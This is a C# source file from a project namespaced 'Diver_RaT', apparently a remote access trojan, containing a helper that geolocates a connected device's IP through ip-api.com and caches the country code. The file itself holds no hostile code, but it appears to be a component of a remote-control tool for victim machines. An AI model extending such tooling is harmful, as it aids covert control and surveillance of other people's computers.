using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace Diver_RaT
{
    public static class CountryResolver
    {
        private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(4) };
        private static readonly Dictionary<string, string> Cache = new();

        public static async Task ResolveAsync(Device device, string lookupIp)
        {
            try
            {
                device.Country = await LookupAsync(lookupIp);
            }
            catch
            {
                // keep whatever country is currently set
            }
        }

        public static async Task<string> LookupAsync(string ip)
        {
            lock (Cache)
            {
                if (Cache.TryGetValue(ip, out var cached)) return cached;
            }

            var result = IsPrivateOrLocal(ip) ? LocalCountryCode() : await GeocodeAsync(ip);

            lock (Cache) Cache[ip] = result;
            return result;
        }

        private static async Task<string> GeocodeAsync(string ip)
        {
            try
            {
                using var req = new HttpRequestMessage(HttpMethod.Get,
                    $"http://ip-api.com/json/{ip}?fields=status,countryCode");
                using var resp = await Http.SendAsync(req);
                if (!resp.IsSuccessStatusCode) return LocalCountryCode();

                using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync());
                var root = doc.RootElement;
                if (root.TryGetProperty("status", out var s) && s.GetString() == "success"
                    && root.TryGetProperty("countryCode", out var cc))
                {
                    return cc.GetString() ?? LocalCountryCode();
                }
            }
            catch
            {
                // offline or blocked -> fall through
            }
            return LocalCountryCode();
        }

        private static bool IsPrivateOrLocal(string ip)
        {
            if (!IPAddress.TryParse(ip, out var addr)) return true;
            if (IPAddress.IsLoopback(addr)) return true;

            if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                var b = addr.GetAddressBytes();
                if (b[0] == 10) return true;
                if (b[0] == 192 && b[1] == 168) return true;
                if (b[0] == 172 && b[1] is >= 16 and <= 31) return true;
            }
            return false;
        }

        private static string LocalCountryCode()
        {
            try
            {
                var name = CultureInfo.CurrentCulture.Name;
                if (string.IsNullOrEmpty(name)) return "US";
                return new RegionInfo(name).TwoLetterISORegionName;
            }
            catch
            {
                return "US";
            }
        }
    }
}
